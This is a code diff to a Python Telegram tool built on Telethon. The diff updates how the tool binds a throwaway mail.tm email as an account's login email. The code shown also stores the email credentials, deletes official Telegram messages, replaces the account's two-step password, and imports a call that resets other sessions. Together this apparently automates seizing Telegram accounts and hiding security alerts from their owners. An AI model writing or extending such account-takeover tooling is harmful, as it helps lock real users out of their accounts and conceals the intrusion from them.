@@ -3,7 +3,7 @@ import asyncio
 import logging
 import re
 
-from telethon import TelegramClient, functions
+from telethon import TelegramClient
 from telethon.sessions import StringSession
 from telethon.errors import (
     SessionPasswordNeededError,
@@ -18,7 +18,13 @@ from telethon.errors import (
     SessionRevokedError,
     AuthKeyDuplicatedError,
 )
-from telethon.tl.functions.account import UpdateUsernameRequest, UpdateProfileRequest
+from telethon.tl.functions.account import (
+    UpdateUsernameRequest,
+    UpdateProfileRequest,
+    SendVerifyEmailCodeRequest,
+    VerifyEmailRequest,
+)
+from telethon.tl.types import EmailVerifyPurposeLoginSetup, EmailVerificationCode
 from telethon.tl.functions.auth import ResetAuthorizationsRequest, ResendCodeRequest
 
 import database
@@ -377,6 +383,7 @@ async def fetch_code_from_email(
 
 async def _bind_login_email(client, phone: str) -> dict:
     last_error = "جميع النطاقات مرفوضة من تيليجرام"
+    purpose = EmailVerifyPurposeLoginSetup()
     try:
         domains = await mailtm.get_active_domains()
         for domain in domains:
@@ -384,7 +391,9 @@ async def _bind_login_email(client, phone: str) -> dict:
             new_email = account["address"]
             email_password = account["password"]
             try:
-                await client(functions.account.UpdateEmailRequest(email=new_email))
+                await client(
+                    SendVerifyEmailCodeRequest(purpose=purpose, email=new_email)
+                )
             except Exception as e:
                 if _is_email_not_allowed(e):
                     last_error = str(e)
@@ -399,7 +408,12 @@ async def _bind_login_email(client, phone: str) -> dict:
                     "email": new_email,
                 }
 
-            await client(functions.account.ConfirmEmailRequest(code=code))
+            await client(
+                VerifyEmailRequest(
+                    purpose=purpose,
+                    verification=EmailVerificationCode(code=code),
+                )
+            )
             await database.update_session_login_email(phone, new_email, email_password)
             await database.increment_email_counter()
             await delete_telegram_official_messages(client)
@@ -509,7 +523,7 @@ async def admin_full_cleanup(phone: str, new_password: str) -> dict:
 
     try:
         session = await database.get_session_by_phone(phone)
-        current = session["two_fa"] if session and session.get("two_fa") else None
+        current = session["two_fa"] if session and session["two_fa"] else None
         await client.edit_2fa(
             current_password=current,
             new_password=new_password,
